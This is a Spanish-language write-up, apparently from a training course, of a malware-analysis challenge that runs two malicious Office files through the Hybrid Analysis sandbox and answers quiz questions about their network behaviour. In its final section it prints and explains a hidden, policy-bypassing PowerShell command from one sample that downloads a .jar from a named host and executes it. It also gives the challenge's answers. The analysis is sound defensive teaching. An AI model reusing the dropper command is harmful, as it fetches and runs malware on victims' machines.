## ¿Qué es una sandbox?
Una sandbox es un entorno virtual seguro donde se ejecutan archivos, aplicaciones o URL maliciosos. Voy a estar utilizando [Hybrid Analysis](https://www.hybrid-analysis.com/) para analizar los siguientes archivos: `PO-465514-180820.doc` y `Siparis_17.xls`.

- Primero subis el archivo:

![image](https://github.com/user-attachments/assets/3343f8ac-0d42-4028-bb5e-453073e56b78)

- Luego seleccionas el Sistema Operativo en el cual sea analizado. En mi caso elegi **Windows 10**:

  ![image](https://github.com/user-attachments/assets/6e1f42bf-d8b2-4d31-8465-4daa563744e2)

- Este seria el resultado:

  ![image](https://github.com/user-attachments/assets/5e7cbb00-8ba6-4a33-9688-ab52fe69877f)

- Para ver todas las acciones que hace el archivo malicioso tenemos que dirigirnos al apartado **Incident Response**.

  ![image](https://github.com/user-attachments/assets/e33eec8b-48d5-4d9d-bdb8-7ef833a606cf)

- **Persistence**: Tecnica utilizada para mantenerse en un sistema incluso despues de reinicios.
- **Fingerprint**: Recolectar información específica sobre un sistema, red o dispositivo.
- **Evasive**: Se utiliza para evitar la detección de antivirus, firewalls o sistemas de detección de intrusos (IDS).
- **Spyware**: Tipo de software malicioso diseñado para espiar las actividades del usuario sin su consentimiento.

En el apartado de **Network Behavior** se ven las direcciones IP que interactuaron con el archivo:

![image](https://github.com/user-attachments/assets/792c553c-6474-4b59-83eb-ea9fd82b6bbf)

Si entramos a la primera direccion IP, podemos ver mucha informacion, como los detalles del archivo, indicadores maliciosos, trafico HTTP, alertas de Suricata y mas...

![image](https://github.com/user-attachments/assets/a357c93a-b3ac-4872-b687-e9cc0161002b)

>- Indicadores maliciosos
>  
> ![image](https://github.com/user-attachments/assets/32d51644-bba6-4000-ab91-f20dc2f9c110)

>- Detalles del Archivo
>  
> ![image](https://github.com/user-attachments/assets/9ed6548e-31f8-4751-afc6-c7a44fb95456)


>- Trafico HTTP
>  
> ![image](https://github.com/user-attachments/assets/c6aad64b-be5c-4254-a01b-2baf0d6d7857)

>- Alertas de Suricata
>  
>  ![image](https://github.com/user-attachments/assets/3605cb46-399f-4a40-80ea-ddcd7e2e5e06)

>- Capturas de Pantalla sobre el archivo abierto
>  
> ![image](https://github.com/user-attachments/assets/f65a3d1e-ea53-4de6-bb73-cdc2edbd52f9)
> ![image](https://github.com/user-attachments/assets/16a6af6e-4d67-4ea9-bf7a-6ec1063eb371)


---


**The file PO-465514-180820.doc is trying to make a request to a domain ending with ".kz". What is this domain?**

En el apartado de **Network Behavior** se ve la conexion que hace con el dominio `www.msbc.kz`.

![image](https://github.com/user-attachments/assets/d2a619a3-b367-4093-83bf-440e08d98b82)

---

**With which Windows tool are the connection requests made? (file:PO-465514-180820.doc)**

Con la herramienta `powershell.exe`.

![image](https://github.com/user-attachments/assets/06140ab1-949a-4fb5-9036-f398e4675876)

---

**How many addresses does the file send DNS requests to? (file:PO-465514-180820.doc)**

`5`

---

**The "Siparis_17.xls" malware document is trying to download a file. With what name does he want to save the file it is trying to download to the device?**

Al analizar el archivo me encontre con un comando muy sospechoso de powershell, el cual era el siguiente:


```
/c powershell -executionpolicy bypass -W Hidden -command "& { (new-object System.Net.WebClient).DownloadFile(\"http://hocoso.mobi\" ,\" %temp%\\6LeGwKmrm.jar\") }" & %temp%\\6LeGwKmrm.jar
```



## Codigo explicado

>```(new-object System.Net.WebClient).DownloadFile:```
>
>- Crea un objeto de tipo WebClient para realizar descargas desde una URL.

> ```DownloadFile("http://hocoso.mobi", "%TEMP%\\6LeGwKmrm.jar"):```
>- Descarga un archivo desde la URL http://hocoso.mobi.

Y por ultimo guarda el archivo descargado en la carpeta temporal del sistema (%TEMP%) con el nombre `6LeGwKmrm.jar`.

Por lo que la respuesta es: `6LeGwKmrm.jar`.

---

- Al finalizar con el ultimo reto del curso me dieron la siguiente Certificacion:

![Screenshot From 2025-01-18 19-08-41](https://github.com/user-attachments/assets/272dfc67-11c6-470d-bc43-44a67f5b4bee)


Espero que hayan aprendido mucho de este Writeup, se vienen mas!









